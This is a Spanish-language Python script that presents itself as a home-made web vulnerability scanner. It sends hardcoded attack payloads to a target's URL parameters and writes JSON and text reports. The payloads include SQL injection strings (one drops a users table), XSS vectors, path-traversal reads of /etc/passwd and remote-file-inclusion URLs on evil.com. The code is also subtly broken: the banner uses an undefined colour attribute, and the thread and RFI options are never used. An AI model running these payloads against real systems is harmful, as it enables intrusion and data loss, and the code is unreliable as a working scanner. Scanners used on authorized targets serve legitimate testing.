#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
MX-WEBSCAN v1.0 - Escáner de Vulnerabilidades Web
Hecho en México 🇲🇽 por MFH TOOLS SECURITY MX
“Escanea como los grandes, pero con más sazón”
"""

import requests
import argparse
from urllib.parse import urljoin, urlparse
import threading
from datetime import datetime
import sys
import os
import json

# ========== COLORES ==========
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    ORANGE = '\033[38;5;208m'
    MEXICO_GREEN = '\033[38;5;34m'
    MEXICO_RED = '\033[38;5;196m'

# ========== PAYLOADS ==========
PAYLOADS = {
    'sqli': [
        "'",
        "\"",
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT NULL--",
        "admin' --",
        "1' ORDER BY 1--",
        "1' ORDER BY 100--",
        "' UNION SELECT 1,2,3--",
        "'; DROP TABLE users--"
    ],
    'xss': [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "\"><script>alert('XSS')</script>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "'-alert('XSS')-'",
        "<body onload=alert('XSS')>",
        "<input onfocus=alert('XSS') autofocus>"
    ],
    'lfi': [
        "../../../etc/passwd",
        "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "../../../../etc/passwd%00",
        "../../../../etc/passwd",
        "/etc/passwd",
        "C:\\windows\\win.ini"
    ],
    'rfi': [
        "http://evil.com/shell.txt?",
        "https://evil.com/shell.php",
        "data:text/plain,<?php phpinfo();?>"
    ]
}

# ========== BANNER ==========
def show_banner():
    banner = f"""
{Colors.ORANGE}╔══════════════════════════════════════════════════════════╗
║                                                              ║
║   {Colors.MEXICO_GREEN}███╗   ███╗██╗  ██╗    ██╗    ██╗███████╗{Colors.ORANGE}         ║
║   {Colors.MEXICO_GREEN}████╗ ████║╚██╗██╔╝    ██║    ██║██╔════╝{Colors.ORANGE}         ║
║   {Colors.MEXICO_GREEN}██╔████╔██║ ╚███╔╝     ██║ █╗ ██║███████╗{Colors.ORANGE}         ║
║   {Colors.MEXICO_GREEN}██║╚██╔╝██║ ██╔██╗     ██║███╗██║╚════██║{Colors.ORANGE}         ║
║   {Colors.MEXICO_GREEN}██║ ╚═╝ ██║██╔╝ ██╗    ╚███╔███╔╝███████║{Colors.ORANGE}         ║
║   {Colors.MEXICO_GREEN}╚═╝     ╚═╝╚═╝  ╚═╝     ╚══╝╚══╝ ╚══════╝{Colors.ORANGE}         ║
║                                                              ║
║   {Colors.MEXICO_WHITE}MX-WEBSCAN v1.0 - Escáner de Vulnerabilidades Web{Colors.ORANGE}      ║
║   {Colors.MEXICO_GREEN}Hecho en México 🇲🇽 - Detecta SQLi, XSS, LFI, RFI{Colors.ORANGE}     ║
║   {Colors.CYAN}MFH TOOLS SECURITY MX - Como Burp Suite, pero mexicano{Colors.ORANGE}       ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝{Colors.END}
    """
    print(banner)

# ========== DETECCIÓN DE TECNOLOGÍAS ==========
def detect_technologies(url):
    """Detecta tecnologías usadas en el sitio"""
    tech = []
    try:
        response = requests.get(url, timeout=5, verify=False)
        headers = response.headers
        server = headers.get('Server', '')
        powered = headers.get('X-Powered-By', '')
        
        if server:
            tech.append(f"Server: {server}")
        if powered:
            tech.append(f"X-Powered-By: {powered}")
        if 'php' in response.text.lower():
            tech.append("PHP detectado")
        if 'asp.net' in response.text.lower():
            tech.append("ASP.NET detectado")
        if 'wordpress' in response.text.lower():
            tech.append("WordPress detectado")
    except:
        pass
    return tech

# ========== ESCANEO SQLI ==========
def scan_sqli(url, param, verbose=False):
    """Escanea SQL injection en un parámetro"""
    vulnerabilities = []
    
    for payload in PAYLOADS['sqli']:
        try:
            # Construir URL con payload
            parsed = urlparse(url)
            if parsed.query:
                test_url = url.replace(param + '=', param + '=' + payload)
            else:
                test_url = f"{url}?{param}={payload}"
            
            if verbose:
                print(f"{Colors.CYAN}[*] Probando SQLi: {payload[:30]}...{Colors.END}")
            
            response = requests.get(test_url, timeout=3, verify=False)
            
            # Detectar posibles SQLi
            content = response.text.lower()
            indicators = [
                'sql', 'mysql', 'syntax error', 'unclosed quotation mark',
                'you have an error in your sql', 'warning: mysql',
                'odbc', 'driver', 'db2', 'postgresql', 'oracle'
            ]
            
            for indicator in indicators:
                if indicator in content:
                    vuln = {
                        'type': 'SQL Injection',
                        'payload': payload,
                        'url': test_url,
                        'indicator': indicator
                    }
                    vulnerabilities.append(vuln)
                    print(f"{Colors.GREEN}[✓] POSIBLE SQLi DETECTADO{Colors.END}")
                    print(f"    Payload: {payload}")
                    print(f"    URL: {test_url}")
                    break
        except:
            continue
    
    return vulnerabilities

# ========== ESCANEO XSS ==========
def scan_xss(url, param, verbose=False):
    """Escanea Cross-Site Scripting"""
    vulnerabilities = []
    
    for payload in PAYLOADS['xss']:
        try:
            parsed = urlparse(url)
            if parsed.query:
                test_url = url.replace(param + '=', param + '=' + payload)
            else:
                test_url = f"{url}?{param}={payload}"
            
            if verbose:
                print(f"{Colors.CYAN}[*] Probando XSS: {payload[:30]}...{Colors.END}")
            
            response = requests.get(test_url, timeout=3, verify=False)
            
            # Si el payload aparece en la respuesta, es vulnerable
            if payload in response.text and payload not in ['<', '>', '"', "'"]:
                vuln = {
                    'type': 'XSS (Reflejado)',
                    'payload': payload,
                    'url': test_url
                }
                vulnerabilities.append(vuln)
                print(f"{Colors.GREEN}[✓] POSIBLE XSS DETECTADO{Colors.END}")
                print(f"    Payload: {payload}")
                print(f"    URL: {test_url}")
        except:
            continue
    
    return vulnerabilities

# ========== ESCANEO LFI ==========
def scan_lfi(url, param, verbose=False):
    """Escanea Local File Inclusion"""
    vulnerabilities = []
    
    for payload in PAYLOADS['lfi']:
        try:
            parsed = urlparse(url)
            if parsed.query:
                test_url = url.replace(param + '=', param + '=' + payload)
            else:
                test_url = f"{url}?{param}={payload}"
            
            if verbose:
                print(f"{Colors.CYAN}[*] Probando LFI: {payload[:30]}...{Colors.END}")
            
            response = requests.get(test_url, timeout=3, verify=False)
            content = response.text.lower()
            
            # Detectar archivos comunes
            indicators = [
                'root:', 'bin:', 'daemon:', 'nobody:', 'windows',
                '[extensions]', 'boot loader', 'system32'
            ]
            
            for indicator in indicators:
                if indicator in content:
                    vuln = {
                        'type': 'LFI',
                        'payload': payload,
                        'url': test_url
                    }
                    vulnerabilities.append(vuln)
                    print(f"{Colors.GREEN}[✓] POSIBLE LFI DETECTADO{Colors.END}")
                    print(f"    Payload: {payload}")
                    print(f"    URL: {test_url}")
                    break
        except:
            continue
    
    return vulnerabilities

# ========== ENCONTRAR PARÁMETROS ==========
def find_parameters(url):
    """Encuentra parámetros en la URL"""
    params = []
    parsed = urlparse(url)
    if parsed.query:
        for param in parsed.query.split('&'):
            if '=' in param:
                params.append(param.split('=')[0])
    return params

# ========== GUARDAR REPORTE ==========
def save_report(target, vulnerabilities, filename=None):
    """Guarda el reporte en formato JSON y TXT"""
    if not filename:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"webscan_{target.replace('/', '_').replace(':', '')}_{timestamp}"
    
    # Guardar JSON
    json_file = f"{filename}.json"
    with open(json_file, 'w', encoding='utf-8') as f:
        json.dump({
            'target': target,
            'scan_date': datetime.now().isoformat(),
            'total_vulnerabilities': len(vulnerabilities),
            'vulnerabilities': vulnerabilities
        }, f, indent=4, ensure_ascii=False)
    
    # Guardar TXT
    txt_file = f"{filename}.txt"
    with open(txt_file, 'w', encoding='utf-8') as f:
        f.write("=" * 60 + "\n")
        f.write("MX-WEBSCAN v1.0 - Reporte de Vulnerabilidades\n")
        f.write(f"Hecho en México 🇲🇽 - MFH TOOLS SECURITY MX\n")
        f.write("=" * 60 + "\n\n")
        f.write(f"Objetivo: {target}\n")
        f.write(f"Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Vulnerabilidades encontradas: {len(vulnerabilities)}\n\n")
        
        if vulnerabilities:
            for i, vuln in enumerate(vulnerabilities, 1):
                f.write(f"{i}. {vuln['type']}\n")
                f.write(f"   Payload: {vuln['payload']}\n")
                f.write(f"   URL: {vuln['url']}\n")
                if 'indicator' in vuln:
                    f.write(f"   Indicador: {vuln['indicator']}\n")
                f.write("\n")
        else:
            f.write("No se encontraron vulnerabilidades.\n")
    
    print(f"\n{Colors.GREEN}[✓] Reportes guardados:{Colors.END}")
    print(f"   - JSON: {json_file}")
    print(f"   - TXT: {txt_file}")
    return json_file, txt_file

# ========== MAIN ==========
def main():
    show_banner()
    
    parser = argparse.ArgumentParser(
        description='MX-WEBSCAN - Escáner de Vulnerabilidades Web',
        epilog='Ejemplo: python mx-webscan.py -u "http://example.com/page.php?id=1"'
    )
    
    parser.add_argument('-u', '--url', required=True, help='URL objetivo (con parámetros)')
    parser.add_argument('--sqli', action='store_true', help='Escaneo SQL injection')
    parser.add_argument('--xss', action='store_true', help='Escaneo XSS')
    parser.add_argument('--lfi', action='store_true', help='Escaneo LFI')
    parser.add_argument('--all', action='store_true', help='Escaneo completo (todo)')
    parser.add_argument('-p', '--param', help='Parámetro específico a escanear')
    parser.add_argument('--threads', type=int, default=5, help='Número de hilos')
    parser.add_argument('-v', '--verbose', action='store_true', help='Modo verbose')
    parser.add_argument('-o', '--output', help='Nombre base para los reportes')
    parser.add_argument('--no-color', action='store_true', help='Deshabilitar colores')
    
    args = parser.parse_args()
    
    # Deshabilitar colores
    if args.no_color:
        for attr in dir(Colors):
            if not attr.startswith('__'):
                setattr(Colors, attr, '')
    
    # Mostrar info del objetivo
    print(f"\n{Colors.BOLD}[*] Objetivo: {args.url}{Colors.END}")
    print(f"{Colors.BOLD}[*] Inicio: {datetime.now().strftime('%H:%M:%S')}{Colors.END}")
    
    # Detectar tecnologías
    print(f"\n{Colors.CYAN}[*] Detectando tecnologías...{Colors.END}")
    tech = detect_technologies(args.url)
    if tech:
        for t in tech:
            print(f"   {Colors.GREEN}→{Colors.END} {t}")
    
    # Encontrar parámetros
    if args.param:
        params = [args.param]
    else:
        params = find_parameters(args.url)
        if not params:
            print(f"{Colors.WARNING}[!] No se encontraron parámetros en la URL{Colors.END}")
            print(f"   Usa -p para especificar un parámetro")
            sys.exit(1)
    
    print(f"\n{Colors.CYAN}[*] Parámetros a escanear: {', '.join(params)}{Colors.END}")
    
    # Determinar qué escanear
    scan_types = []
    if args.all or args.sqli:
        scan_types.append('sqli')
    if args.all or args.xss:
        scan_types.append('xss')
    if args.all or args.lfi:
        scan_types.append('lfi')
    
    if not scan_types:
        scan_types = ['sqli', 'xss', 'lfi']  # Default: todo
    
    # Escanear
    all_vulns = []
    
    for param in params:
        print(f"\n{Colors.BOLD}{Colors.ORANGE}════════════════════════════════════════════════{Colors.END}")
        print(f"{Colors.BOLD}Escaneando parámetro: {param}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.ORANGE}════════════════════════════════════════════════{Colors.END}\n")
        
        if 'sqli' in scan_types:
            print(f"{Colors.BLUE}[*] Escaneando SQL Injection...{Colors.END}")
            vulns = scan_sqli(args.url, param, args.verbose)
            all_vulns.extend(vulns)
        
        if 'xss' in scan_types:
            print(f"\n{Colors.BLUE}[*] Escaneando XSS...{Colors.END}")
            vulns = scan_xss(args.url, param, args.verbose)
            all_vulns.extend(vulns)
        
        if 'lfi' in scan_types:
            print(f"\n{Colors.BLUE}[*] Escaneando LFI...{Colors.END}")
            vulns = scan_lfi(args.url, param, args.verbose)
            all_vulns.extend(vulns)
    
    # Mostrar resumen final
    print(f"\n{Colors.BOLD}{Colors.CYAN}════════════════════════════════════════════════{Colors.END}")
    print(f"{Colors.BOLD}[✓] ESCANEO COMPLETADO{Colors.END}")
    print(f"{Colors.GREEN}[+] Tiempo: {datetime.now().strftime('%H:%M:%S')}{Colors.END}")
    print(f"{Colors.GREEN}[+] Total vulnerabilidades: {len(all_vulns)}{Colors.END}")
    
    if all_vulns:
        print(f"\n{Colors.BOLD}RESUMEN:{Colors.END}")
        for vuln in all_vulns:
            print(f"  {Colors.ORANGE}⚠{Colors.END} {vuln['type']} en {vuln['url'][:60]}...")
    else:
        print(f"\n{Colors.GREEN}[✓] No se encontraron vulnerabilidades{Colors.END}")
    
    # Guardar reporte
    save_report(args.url, all_vulns, args.output)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING}[!] Escaneo interrumpido por el usuario{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"{Colors.FAIL}[!] Error: {e}{Colors.END}")
        sys.exit(1)
